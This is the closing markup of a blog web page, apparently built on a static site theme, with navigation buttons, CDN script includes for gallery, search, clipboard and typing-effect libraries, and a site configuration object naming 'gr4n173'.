                <i class="fas fa-arrow-up fa-fw"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw"></i>
            </a>
        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"gr4n173","id-2":"gr4n173"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
